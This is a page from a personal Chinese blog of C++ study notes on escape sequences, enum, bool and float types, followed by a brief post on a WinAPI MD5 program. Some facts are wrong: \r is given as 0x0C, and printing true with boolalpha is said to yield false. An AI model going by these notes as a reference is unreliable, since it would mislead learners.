<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: #000000 0.5pt solid; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">\t</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="62" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 46.85pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">0x09</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="126" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 95.15pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'"><font face="宋体">水平制表符HT</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">\?</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="65" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 49.1pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">0x3F</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="124" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 93pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'"><font face="宋体">问号</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
</tr>
<tr>
<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: #000000 0.5pt solid; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">\n</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="62" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 46.85pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">0x0A</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="126" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 95.15pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'"><font face="宋体">换行return</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">&#92;</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="65" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 49.1pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">0x5C</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="124" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 93pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'"><font face="宋体">反斜杠字符</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
</tr>
<tr>
<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: #000000 0.5pt solid; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">\v</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="62" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 46.85pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">0x0B</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="126" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 95.15pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'"><font face="宋体">垂直制表符VT</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">\ddd</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="65" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 49.1pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">0ddd</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="124" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 93pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">1~3<font face="宋体">位八进制数</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
</tr>
<tr>
<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: #000000 0.5pt solid; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">\r</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="62" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 46.85pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">0x0C</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="126" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 95.15pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'"><font face="宋体">回车</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">\xhh</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="65" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 49.1pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">0xhh</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="124" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 93pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">1~2<font face="宋体">位十六进制数</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
</tr>
</table>


<p><!--EndFragment--><!--EndFragment-->  3）枚举类型enum;</p>

<p>   枚举型是对整数区间的自定义类型，通常用于整数常量。例如：</p>

<p>   enum Week{mon,tue,wed,thu.fri,sat,sun};</p>

<p>   默认第一个枚举符mon=0,以此类推。或者：</p>

<p>   enum Color{Red=5,Green,Yellow,Blue=20,Orange};</p>

<p>   由上可知，Green=6&hellip;Orange=21;枚举的好处是，在代替整数常量的过程中，枚举不需要初始化常量而直接使用，提高编写效率。</p>

<p>  4）布尔类型bool;</p>

<p>   布尔类型实际的存在意义为:</p>

<p>   enum bool{false,true};</p>

<p>   因此可以进行0或1的逻辑运算。例如：</p>

<p>   bool a = 3;  //a为true;</p>

<p>   在i/o流中，cout&lt;&lt;boolalpha&lt;&lt;a&lt;&lt;endl;//输出结果为false，如果不做boolalpha设置则输出为0;</p>

<p>  5）浮点型;</p>

<p>   浮点型包含单精度浮点float、双精度浮点double以及长双精度浮点long double。其中float、double、long double的十进制有效位数分别为7位、15位和19位。</p>

<p>  外部数据类型等变异类型：</p>

<p>  1）整形数组int[];</p>

<p>  2）浮点应用double&amp;;</p>

<p>  3）字符指针char*;</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2008-03-31T11:05:59+08:00" pubdate data-updated="true">2008-03-31</time></div>
	

<div class="tags">

	<a class='category' href='/blog/categories/c-plus-plus-slash-c/'>c++/c</a>

</div>


	
		<span class="comments"><a href="/blog/2008/03/31/C-xue-xi-bi-ji-chong-wen-ji-hua-zhi-san//posts/22/index.html#disqus_thread">Comments</a></span>
	
</div></article>


    <article class="post">
	<h2 class="title">
		
		<a href="/blog/2008/03/30/jian-dan-de-winapi-shi-xian/">
		
			简单的winapi实现</a>
	</h2>
	<div class="entry-content">
		<p>　第一次接触windows编程，初步领略了下api的复杂程度。修改了一个基本的窗口显示程序，并加入了md5算法模块。较费时的地方在md5和win函数本身的结合部分，包括格式转换和部分函数的参数限制。现在的想法是先了解下mfc，以便进行下一步的设计实现。</p>

<p>　<a href="http://www.hanyi.name/blog/wp-content/uploads/2008/03/md5.jpg" title="md5.jpg"><img src="http://www.hanyi.name/blog/wp-content/uploads/2008/03/md5.thumbnail.jpg" alt="md5.jpg" /></a></p>

<p> scode download:<a href="http://www.hanyi.name/blog/wp-content/uploads/2008/03/md5.rar" title="md5">md5</a></p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2008-03-30T13:13:16+08:00" pubdate data-updated="true">2008-03-30</time></div>
	

<div class="tags">

	<a class='category' href='/blog/categories/xiang-mu/'>项目</a>

</div>


	
		<span class="comments"><a href="/blog/2008/03/30/jian-dan-de-winapi-shi-xian//posts/22/index.html#disqus_thread">Comments</a></span>
	
</div></article>

<nav id="pagenavi">
    
    	
        	<a href="/posts/21" class="prev">Prev</a>
        
    
    
        <a href="/posts/23" class="next">Next</a>
    
    <div class="center"><a href="/archives">Blog Archives</a></div>
</nav></div>
	<footer id="footer" class="inner">Copyright &copy; 2018

    Han Yi

<br>
Powered by Octopress.
</footer>
	<script src="/javascripts/slash.js"></script>
<script src="/javascripts/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
	$('.fancybox').fancybox();
})(jQuery);
</script> <!-- Delete or comment this line to disable Fancybox -->


<script type="text/javascript">
      var disqus_shortname = 'hanyi';
      
        
        var disqus_script = 'count.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>





</body>
</html>
